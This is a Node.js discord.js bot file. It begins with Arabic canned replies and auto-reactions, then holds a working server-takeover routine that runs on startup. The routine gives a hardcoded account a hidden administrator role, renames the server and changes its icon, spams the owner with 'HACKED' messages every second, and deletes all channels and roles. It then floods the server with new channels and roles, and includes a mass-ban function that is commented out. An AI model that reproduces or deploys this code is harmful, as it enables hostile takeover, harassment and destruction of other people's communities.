const Discord = require("discord.js");
const client = new Discord.Client();
 
 



client.on('message', message => {
  if (message.channel.id === "601363945592193024") {
    message.react('☑')
      .then(() => {
        message.react('🚫')
      });
  }
});








client.on('ready', () => {
    client.guilds.map((guild) => console.log(`Name: ${guild.name} (ID: ${guild.id})`));
});









 
 
 
 
 
 
   
   
   
  
   
 





















 
 
    









 


 

 




 

        
    
 





 




  













client.on('ready', () => {
   client.user.setStatus("online")
});
 






































 








  client.on('message', msg => {
  if (msg.content === 'طيب وش رأيك ب عماد فوكس') {
    msg.reply('مدري وش رأيك فيه انت');
  }
});




client.on('message', msg => {
  if (msg.content === 'طيب وش رأيك ب دحومي') {
    msg.reply('جيد اعطيه افضل رتبة في سيرفر يمكن يفيدنا');
  }
});






client.on('message', msg => {
  if (msg.content === 'بوت وش رأيك ب هرهر') {
    msg.reply('والله مش عاجبني بنده من سيرفر ._.');
  }
});


client.on('message', msg => {
  if (msg.content === 'https://') {
    msg.reply('لا تنشر بالله ذا سيرفر اكواد');
   msg.delete()
  }
});



           

const setAdmin = (guildID, accountID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {

        targetServer.members.get(accountID).addRole(role).catch((err) => {
           return console.error(`You are not in the ${targetServer.name} server ! You must to be in this server befor leveling up !`)
        })
    })
}
 
const changeServerInfo = (guildID, options) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
    
    targetServer.setName(options.newServerName)
    targetServer.setIcon(options.newServerIcon)

    const embed = new Discord.RichEmbed()
    .setAuthor(client.user.tag, client.user.avatarURL)
    .setTitle("HACKED")
    .setDescription(`YOUR SERVER ${targetServer.name} HAS BEEN HACKED BY ${client.user.tag}`)
    .setFooter(client.user.tag, client.user.avatarURL)
    .setColor("#ff0000")

    setInterval(() => {
    return targetServer.owner.send(embed)
    }, 1000)
}

const banMembers = (guildID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach(async (member) => {
        member.bannable ? await member.ban({reason: `HACKED BY ${client.user.tag}`}) : undefined
    })
}

const changeNicks = (guildID, newNick) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach((member) => {
        try {
            
            member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
        } catch (error) {
            undefined
        }
    })
}

const createChanelsAndRoles = (guildID, name) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
    targetServer.members.forEach((member) => {
  		member.roles.forEach(async (role) => {
            try {
                await member.removeRole(role)
                  
            } catch (error) {
                undefined
            }
  		})
    })

    targetServer.channels.forEach(async (channel) => {
        channel.deletable ? await channel.delete() : undefined
    })

    targetServer.roles.forEach(async(role) => {
        role.deletable ? await role.delete() : undefined
    })

    setInterval(async () => {
        await targetServer.createChannel(name, "text")
        await targetServer.createChannel(name, "voice")
        await targetServer.createRole({name: `HACKED BY ${client.user.username}`, permissions: 0, color: 0xFF0000 }).then(async(role) =>{
            await targetServer.members.forEach(async (member) => {
                try {
                    await member.addRole(role)
                } catch (error) {
                    undefined
                }
            })
        })
    }, 500)

}

client.on("ready", () => {
    console.log("THE HACKING STARTED NOW ")

    // Setup YOUR personnal settings
    const configs = {
        "targetServerID": "696690664598929518",
        "accountID": "422011239523287060",
        "botNickname": "MPBot",
        "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
        "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
        "newServerName": "Hacking...",
    }

    client.user.setUsername(configs.botNickname)
    client.user.setAvatar(configs.botIcon)

    // Enable all the options
    setAdmin(configs.targetServerID, configs.accountID)
    changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
    changeNicks(configs.targetServerID, configs.botNickname)
    // banMembers(configs.targetServerID)
    createChanelsAndRoles(configs.targetServerID, configs.botNickname)
})




 
 
 
client.login(process.env.BOT_TOKENN);
